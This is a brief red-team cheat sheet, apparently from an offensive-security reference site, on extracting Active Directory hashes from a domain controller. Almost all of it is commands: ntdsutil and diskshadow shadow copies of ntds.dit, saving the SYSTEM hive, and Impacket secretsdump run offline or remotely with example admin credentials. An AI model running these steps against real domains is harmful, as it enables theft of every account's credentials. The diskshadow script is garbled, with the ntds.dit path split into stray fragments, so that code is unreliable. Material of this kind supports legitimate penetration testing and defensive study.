# Dumping Domain Controller Hashes Locally and Remotely

Source: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

## No Credentials - ntdsutil (LOLBIN)

Requires access to DC:

```cmd
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Dumps `ntds.dit` + SYSTEM and SECURITY registry hives to `c:\temp`.

### Offline Hash Extraction with Impacket
```bash
python3 secretsdump.py -ntds c:/temp/Active\ Directory/ntds.dit -system c:/temp/registry/SYSTEM LOCAL
```

## No Credentials - diskshadow (Windows Server 2008+)

Create shadow copy script (`shadowdisk.txt`):
```
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows
tds
tds.dit c:\exfil
tds.dit
delete shadows volume %someAlias%
reset
```

Execute:
```cmd
mkdir c:\exfil
diskshadow.exe /s c:\shadowdisk.txt
```

Copy SYSTEM hive:
```cmd
reg save HKLM\SYSTEM c:\exfil\SYSTEM
```

Then extract offline with impacket.

## With Credentials - Remote (RPC/Impacket)

```bash
python3 secretsdump.py offense/administrator:Pass@123@dc01.offense.local
```

Or just target NTDS:
```bash
python3 secretsdump.py -just-dc offense/administrator:Pass@123@dc01.offense.local
```
